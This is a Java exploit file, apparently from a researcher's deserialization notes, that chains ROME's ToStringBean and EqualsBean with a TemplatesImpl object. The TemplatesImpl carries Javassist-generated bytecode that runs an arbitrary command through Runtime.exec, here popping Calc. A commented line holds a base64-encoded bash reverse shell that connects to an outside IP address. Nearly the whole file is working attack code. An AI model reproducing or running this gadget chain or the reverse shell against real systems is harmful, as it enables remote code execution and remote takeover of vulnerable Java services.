import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import java.lang.reflect.Field;

// ToStringBean 的 EXP
public class ToStringBeanEXP {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_name","Drunkbaby");
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        Class c = templates.getClass();
        Field byteCodesField = c.getDeclaredField("_bytecodes");
        byteCodesField.setAccessible(true);
        byte[] evil = getTemplatesImpl("Calc");
        byte[][] codes = {evil};
        byteCodesField.set(templates,codes);
//        templates.newTransformer();
        ToStringBean toStringBean = new ToStringBean(c,templates);
//        toStringBean.toString();
        Class toStringBeanEvil = toStringBean.getClass();
        EqualsBean equalsBean = new EqualsBean(toStringBeanEvil,toStringBean);
        equalsBean.beanHashCode();

    }

    public static byte[] getTemplatesImpl(String cmd) {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("Evil");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = ctClass.makeClassInitializer();
            constructor.setBody(" try {\n" +
                    " Runtime.getRuntime().exec(\"" + cmd +
                    "\");\n" +
                    " } catch (Exception ignored) {\n" +
                    " }");
            // "new String[]{\"/bin/bash\", \"-c\", \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMC4xMS4yMzEvOTk5MCAwPiYx}|{base64,-d}|{bash,-i}\"}"
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[]{};
        }
    }

    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception {
        Class clazz = object.getClass();
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object,value);
    }
}
